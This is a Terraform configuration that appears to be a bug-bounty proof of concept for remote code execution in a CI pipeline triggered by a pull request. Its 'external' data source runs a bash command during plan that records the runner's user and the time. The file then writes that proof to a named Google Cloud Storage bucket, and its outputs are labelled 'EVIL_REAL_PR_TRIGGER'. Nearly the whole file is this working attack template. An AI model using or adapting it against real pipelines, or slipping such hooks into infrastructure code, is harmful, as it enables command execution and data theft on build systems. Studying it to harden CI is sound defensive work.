terraform {
  required_version = ">= 1.2.0"
  required_providers {
    google = {
      source  = "hashicorp/google"
      version = ">= 4.0"
    }
    external = {
      source  = "hashicorp/external"
      version = ">= 2.0"
    }
  }
}

variable "project_id" {
  default = "ellison-hunt-1102-c86d"
}

data "external" "rce_real" {
  program = ["bash", "-c", "echo '{\"proof\": \"REAL_GITHUB_PR_TRIGGER_RCE\", \"time\": \"'$(date -u +%Y-%m-%dT%H:%M:%SZ)'\", \"user\": \"'$(whoami)'\"}'"]
}

resource "google_storage_bucket_object" "marker" {
  name    = "im-pr-attack-test/marker.txt"
  bucket  = "ellison-hunt-1102-c86d-vrp-test"
  content = data.external.rce_real.result.proof
}

output "status" { value = "EVIL_REAL_PR_TRIGGER" }
output "rce_proof" { value = data.external.rce_real.result.proof }
